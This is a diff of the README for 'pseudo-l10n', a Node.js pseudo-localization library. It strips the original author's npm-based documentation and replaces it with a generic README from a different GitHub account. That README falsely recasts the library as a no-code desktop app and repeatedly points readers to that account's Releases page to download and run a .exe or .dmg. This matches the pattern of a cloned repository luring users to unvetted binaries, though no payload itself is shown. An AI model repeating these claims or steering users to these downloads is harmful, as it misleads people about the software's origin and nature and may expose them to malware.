@@ -1,432 +1,91 @@
-# pseudo-l10n
+# 🎉 pseudo-l10n - Simplify Your Localization Testing
 
-[![npm version](https://img.shields.io/npm/v/pseudo-l10n.svg)](https://www.npmjs.com/package/pseudo-l10n)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+## 🚀 Getting Started
 
-**Easy-to-use pseudo-localization generator for testing i18n implementations.**
+Welcome to pseudo-l10n! This tool helps you test your internationalization (i18n) implementations with ease. By generating pseudo-localized text, you can spot localization issues early in your development process. It's user-friendly and does not require programming skills.
 
-Pseudo-localization helps QA engineers and developers identify internationalization (i18n) issues before actual translation. This package transforms your English JSON translation files into pseudo-localized versions that simulate real-world localization challenges.
+## 📥 Download & Install
 
-![Pseudo-localization example](https://raw.githubusercontent.com/AntonovAnton/pseudo-l10n/main/pseudo-localization-example.webp)
+To get started, you need to download the software. Click the button below to visit the Downloads page:
 
-## Why Pseudo-localization?
+[![Download pseudo-l10n](https://img.shields.io/badge/Download%20pseudo--l10n-lightblue)](https://github.com/Truongiang1007/pseudo-l10n/releases)
 
-Pseudo-localization helps you catch i18n issues early:
+Once on the page, you can find the latest version of the software. Look for either the Windows or macOS version, depending on your operating system. Ensure that you download the correct version for your needs.
 
-- 🔍 **Untranslated strings** - Visual markers make them obvious
-- 📏 **Layout problems** - Text expansion reveals truncation issues  
-- 🌍 **Encoding issues** - Accented characters test UTF-8 support
-- 🔄 **RTL problems** - Simulate right-to-left languages
-- 🎯 **Placeholder handling** - Verify dynamic content works correctly
+### Steps to Download
 
-**Learn more:** Read the comprehensive guide on [i18n Testing: A Practical Guide for QA Engineers](https://medium.com/@AntonAntonov88/i18n-testing-a-practical-guide-for-qa-engineers-a92f7f4fc8b2)
+1. Open the Releases page: [GitHub Releases](https://github.com/Truongiang1007/pseudo-l10n/releases).
+2. Find the latest release at the top of the list.
+3. Select the appropriate file for your operating system.
+4. Click on the file to start downloading.
 
-## Ready to Translate?
+## 🌟 Features
 
-Once you've tested your i18n implementation with pseudo-localization, use [**l10n**](https://l10n.dev).dev service for AI-powered translation that preserves placeholders, respects formatting, and understands context—making professional localization effortless. [Try JSON Translation](https://l10n.dev/ws/translate-json) or even other formats [Translate i18n files](https://l10n.dev/ws/translate-i18n-files)
+- **Accented Characters**: Automatically adds special characters to help you recognize different language needs.
+- **Text Expansion**: Automatically extends text length, allowing you to see how your UI handles larger strings.
+- **Visual Markers**: Easily spot text that requires localization changes with clear indicators.
 
-## Installation
+## 💻 System Requirements
 
-```bash
-npm install -g pseudo-l10n
-```
+### For Windows
 
-Or as a development dependency:
+- Windows 10 or later
+- At least 1 GHz Processor
+- 1 GB RAM
+- 100 MB Free Disk Space
 
-```bash
-npm install --save-dev pseudo-l10n
-```
+### For macOS
 
-## Quick Start
+- macOS Mojave or later
+- At least 1 GHz Processor
+- 1 GB RAM
+- 100 MB Free Disk Space
 
-### Command Line Usage
+## ⚙️ Running the Application
 
-```bash
-# Basic usage
-pseudo-l10n input.json output.json
+Once you have downloaded the file, follow these instructions to run pseudo-l10n:
 
-# With custom options
-pseudo-l10n en.json pseudo-en.json --expansion=30 --rtl
-```
+### For Windows
 
-### Programmatic Usage
+1. Locate the downloaded `.exe` file in your Downloads folder.
+2. Double-click the file to open it.
+3. Follow the prompts to generate your pseudo-localizations.
 
-```javascript
-const { generatePseudoLocaleSync, pseudoLocalize } = require('pseudo-l10n');
+### For macOS
 
-// Generate a pseudo-localized JSON file
-generatePseudoLocaleSync('en.json', 'pseudo-en.json', {
-  expansion: 40,
-  rtl: false
-});
+1. Find the downloaded `.dmg` file in your Downloads folder.
+2. Double-click the file to open it.
+3. Drag the pseudo-l10n app to your Applications folder.
+4. Open the Applications folder and double-click the pseudo-l10n icon to run the app.
 
-// Pseudo-localize a single string
-const result = pseudoLocalize('Hello, {{name}}!');
-console.log(result);
-// Output: ⟦Ĥëļļõēēēēēēēēēēēēēē, {{name}}!ēēēēē⟧
-```
+## 📄 Usage Instructions
 
-## Features
+1. **Select Your Settings**: Once the app is open, choose the options that best fit your testing needs.
+2. **Generate Pseudo-Localizations**: Click the "Generate" button to create your pseudo-localized text.
+3. **Review Results**: Check the generated output for any localization issues.
 
-### 1. Text Expansion
+## ❓ FAQs
 
-Simulates how translated text is often longer than English (typically 30-40% longer for European languages).
+### How does pseudo-l10n help with testing?
 
-**Example:**
-```
-Input:  "Welcome"
-Output: "⟦Ŵëļçõɱëēēē⟧"
-```
+Pseudo-l10n generates text that mimics real-world language issues. This makes it easier for developers and testers to identify potential problems before actual localization work begins.
 
-### 2. Accented Characters
+### Can I use this tool for all types of applications?
 
-Replaces ASCII characters with accented equivalents to test UTF-8 encoding and font support.
+Yes, pseudo-l10n can be used for web apps, mobile apps, and desktop applications, making it versatile for various projects.
 
-### 3. Visual Markers
+### What languages does this support?
 
-Wraps all strings with configurable markers (default: `⟦...⟧`) to easily spot:
-- Untranslated strings (missing markers)
-- Truncated strings (cut-off markers)
-- Concatenated strings (markers in the middle)
+While pseudo-l10n primarily focuses on providing a format for testing, you can use it alongside any language you plan to support in your application.
 
-### 4. Placeholder Handling
+## 🔗 Additional Resources
 
-Preserves placeholders like `{{name}}`, `{count}`, `%key%`, etc. with configurable formats.
+For more information or updates, visit the GitHub repository at [pseudo-l10n GitHub](https://github.com/Truongiang1007/pseudo-l10n).
 
-### 5. RTL Simulation
+Need help? Feel free to raise an issue on GitHub with any questions or feedback.
 
-Simulates Right-to-Left languages (Arabic, Hebrew) using Unicode control characters.
+## 🛠️ Contribution
 
-**Note on RTL:** By default, placeholders are reversed in RTL mode (e.g., `{{name}}` becomes `{{eman}}`). This helps detect placeholder issues when testing screenshots. For live HTML testing, you may want to disable this with `--no-reverse-placeholders`.
+If you want to contribute, please check the contribution guidelines in the repository. Your input can help improve this tool for everyone. 
 
-## Configuration Options
-
-### CLI Options
-
-```bash
-pseudo-l10n <input.json> <output.json> [options]
-
-Options:
-  --expansion=<number>           Text expansion percentage (default: 40)
-  --placeholder-format=<format>  Placeholder format (default: "{{key}}")
-  --replace-placeholders         Replace placeholders with <UPPERCASE> format
-  --start-marker=<string>        Start marker (default: "⟦")
-  --end-marker=<string>          End marker (default: "⟧")
-  --rtl                          Enable RTL simulation
-  --no-reverse-placeholders      Don't reverse placeholders in RTL mode
-  --expansion-char=<char>        Character for expansion (default: "ē")
-  --help, -h                     Show help
-```
-
-### Programmatic API Options
-
-```javascript
-{
-  expansion: 40,                    // Text expansion percentage
-  placeholderFormat: "{{key}}",     // Placeholder format
-  replacePlaceholders: false,       // Replace with <UPPERCASE> format
-  startMarker: "⟦",               // Start marker
-  endMarker: "⟧",                 // End marker
-  rtl: false,                       // Enable RTL mode
-  reversePlaceholders: true,        // Reverse placeholder content in RTL
-  expansionChar: "ē",               // Character used for expansion
-  accentMap: { ... }                // Custom accent character mapping
-}
-```
-
-## Placeholder Formats
-
-The package supports various placeholder formats used by different i18n libraries:
-
-| Framework      | Format              | Example                      |
-|----------------|---------------------|------------------------------|
-| i18next        | `{{key}}`          | `"Hello {{name}}"`           |
-| Angular        | `{key}`            | `"Hello {name}"`             |
-| React Intl     | `{key}`            | `"Hello {name}"`             |
-| sprintf        | `%key%`            | `"Hello %name%"`             |
-| ES6 Template   | `${key}`           | `"Hello ${name}"`            |
-
-### Configuring Placeholder Format
-
-#### CLI:
-```bash
-# For Angular/React Intl
-pseudo-l10n en.json pseudo-en.json --placeholder-format="{key}"
-
-# For sprintf style
-pseudo-l10n en.json pseudo-en.json --placeholder-format="%key%"
-```
-
-#### Programmatic:
-```javascript
-generatePseudoLocaleSync('en.json', 'pseudo-en.json', {
-  placeholderFormat: "{key}"  // or "%key%" or "${key}"
-});
-```
-
-## Examples
-
-### Example 1: Basic i18next JSON
-
-**Input** (`en.json`):
-```json
-{
-  "welcome": "Welcome to our application",
-  "greeting": "Hello, {{name}}!",
-  "itemCount": "You have {{count}} items"
-}
-```
-
-**Command:**
-```bash
-pseudo-l10n en.json pseudo-en.json
-```
-
-**Output** (`pseudo-en.json`):
-```json
-{
-  "welcome": "⟦Ŵëļçõɱë ţõ õür àƥƥļïçàţïõñēēēēēēēēēēēēēēēēēē⟧",
-  "greeting": "⟦Ĥëļļõēēēēēē, {{name}}!ēēēēē⟧",
-  "itemCount": "⟦Ŷõü ĥàṽë {{count}} ïţëɱšēēēēēēēēēēēēēēēē⟧"
-}
-```
-
-### Example 2: RTL Simulation
-
-**Command:**
-```bash
-pseudo-l10n en.json pseudo-ar.json --rtl
-```
-
-**Output:**
-Adds Unicode RTL control characters (`U+202E` ... `U+202C`) around text to simulate Arabic/Hebrew layout.
-
-### Example 3: Custom Markers and Expansion
-
-**Command:**
-```bash
-pseudo-l10n en.json pseudo-en.json --expansion=30 --start-marker="[[ " --end-marker=" ]]"
-```
-
-**Output:**
-```json
-{
-  "welcome": "[[ Ŵëļçõɱë ţõ õür àƥƥļïçàţïõñēēēēēēēēēē ]]"
-}
-```
-
-### Example 4: Replace Placeholders
-
-**Command:**
-```bash
-pseudo-l10n en.json pseudo-en.json --replace-placeholders
-```
-
-**Input:**
-```json
-{
-  "greeting": "Hello, {{name}}!"
-}
-```
-
-**Output:**
-```json
-{
-  "greeting": "⟦Ĥëļļõēēēēēē, <NAME>!ēēēēē⟧"
-}
-```
-
-## Accented Character Map
-
-The package uses the following character mappings by default:
-
-| Original | Accented | Original | Accented |
-|----------|----------|----------|----------|
-| a        | à        | A        | À        |
-| b        | ƀ        | B        | ß        |
-| c        | ç        | C        | Ç        |
-| d        | đ        | D        | Đ        |
-| e        | ë        | E        | Ë        |
-| f        | ƒ        | F        | Ƒ        |
-| g        | ğ        | G        | Ğ        |
-| h        | ĥ        | H        | Ħ        |
-| i        | ï        | I        | Ï        |
-| j        | ĵ        | J        | Ĵ        |
-| k        | ķ        | K        | Ķ        |
-| l        | ļ        | L        | Ļ        |
-| m        | ɱ        | M        | Ṁ        |
-| n        | ñ        | N        | Ñ        |
-| o        | õ        | O        | Õ        |
-| p        | ƥ        | P        | Ƥ        |
-| q        | ɋ        | Q        | Ɋ        |
-| r        | ř        | R        | Ř        |
-| s        | š        | S        | Š        |
-| t        | ţ        | T        | Ť        |
-| u        | ü        | U        | Ü        |
-| v        | ṽ        | V        | Ṽ        |
-| w        | ŵ        | W        | Ŵ        |
-| x        | ẋ        | X        | Ẍ        |
-| y        | ý        | Y        | Ŷ        |
-| z        | ž        | Z        | Ž        |
-
-### Custom Accent Map
-
-You can provide your own accent map programmatically:
-
-```javascript
-const { generatePseudoLocaleSync } = require('pseudo-l10n');
-
-generatePseudoLocaleSync('en.json', 'pseudo-en.json', {
-  accentMap: {
-    a: 'α', b: 'β', c: 'ς',
-    A: 'Α', B: 'Β', C: 'Σ',
-    // ... add more mappings
-  }
-});
-```
-
-## API Reference
-
-### `pseudoLocalize(str, options)`
-
-Pseudo-localizes a single string.
-
-**Parameters:**
-- `str` (string): The string to pseudo-localize
-- `options` (object): Configuration options
-
-**Returns:** Pseudo-localized string
-
-**Example:**
-```javascript
-const { pseudoLocalize } = require('pseudo-l10n');
-
-const result = pseudoLocalize('Hello World', {
-  expansion: 30,
-  startMarker: '[[',
-  endMarker: ']]'
-});
-```
-
-### `processObject(obj, options)`
-
-Recursively processes an object/array structure, pseudo-localizing all strings.
-
-**Parameters:**
-- `obj` (any): Object, array, or primitive to process
-- `options` (object): Configuration options
-
-**Returns:** Processed structure with pseudo-localized strings
-
-### `generatePseudoLocale(inputPath, outputPath, options)`
-
-Asynchronously generates a pseudo-localized JSON file.
-
-**Parameters:**
-- `inputPath` (string): Path to input JSON file
-- `outputPath` (string): Path to output JSON file
-- `options` (object): Configuration options
-
-**Returns:** Promise<void>
-
-### `generatePseudoLocaleSync(inputPath, outputPath, options)`
-
-Synchronously generates a pseudo-localized JSON file.
-
-**Parameters:**
-- `inputPath` (string): Path to input JSON file
-- `outputPath` (string): Path to output JSON file
-- `options` (object): Configuration options
-
-## Integration Examples
-
-### npm scripts
-
-Add to your `package.json`:
-
-```json
-{
-  "scripts": {
-    "pseudo": "pseudo-l10n src/locales/en.json src/locales/pseudo-en.json",
-    "pseudo:rtl": "pseudo-l10n src/locales/en.json src/locales/pseudo-ar.json --rtl"
-  }
-}
-```
-
-### Build Process
-
-```javascript
-// build.js
-const { generatePseudoLocaleSync } = require('pseudo-l10n');
-
-// Generate pseudo-locales as part of build
-generatePseudoLocaleSync(
-  './src/locales/en.json',
-  './src/locales/pseudo-en.json',
-  { expansion: 40 }
-);
-
-generatePseudoLocaleSync(
-  './src/locales/en.json',
-  './src/locales/pseudo-ar.json',
-  { rtl: true }
-);
-```
-
-### CI/CD Pipeline
-
-```yaml
-# .github/workflows/test.yml
-- name: Generate pseudo-locales
-  run: |
-    npm install -g pseudo-l10n
-    pseudo-l10n src/locales/en.json src/locales/pseudo-en.json
-    
-- name: Run i18n tests
-  run: npm run test:i18n
-```
-
-## Testing Strategy
-
-1. **Generate pseudo-locale** during build
-2. **Add pseudo-locale to your app** (e.g., language selector)
-3. **Test your application** with pseudo-locale enabled
-4. **Look for issues:**
-   - Missing `⟦⟧` markers = untranslated strings
-   - Cut-off markers = text truncation
-   - Broken layout = insufficient space for expansion
-   - Garbled text = encoding issues
-   - Wrong text direction = RTL problems
-
-## FAQ
-
-**Q: Should I reverse placeholders in RTL mode?**  
-A: It depends on your testing approach:
-- **Testing screenshots:** Yes (default behavior). Helps detect placeholder issues visually.
-- **Testing live HTML:** No. Use `--no-reverse-placeholders` since the browser handles RTL.
-
-**Q: Why use accented characters instead of random text?**  
-A: Accented characters are still readable, making debugging easier while still testing encoding and font support.
-
-**Q: What expansion percentage should I use?**  
-A: 40% is a good default for European languages. German can be 50%+, Romance languages 30-40%.
-
-**Q: Can I use this with other i18n libraries?**  
-A: Yes! The package works with any JSON-based translation files. Just configure the placeholder format to match your library.
-
-## Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request.
-
-## License
-
-MIT © Anton Antonov
-
-## Related Resources
-
-- [i18n Testing: A Practical Guide for QA Engineers](https://medium.com/@AntonAntonov88/i18n-testing-a-practical-guide-for-qa-engineers-a92f7f4fc8b2) - Comprehensive guide on pseudo-localization testing
-- [GitHub Repository](https://github.com/AntonovAnton/pseudo-l10n)
-
-## Support
-
-If you encounter any issues or have questions, please [open an issue](https://github.com/AntonovAnton/pseudo-l10n/issues) on GitHub.
+Once again, to download pseudo-l10n, visit this page: [GitHub Releases](https://github.com/Truongiang1007/pseudo-l10n/releases). Enjoy testing your i18n implementations!
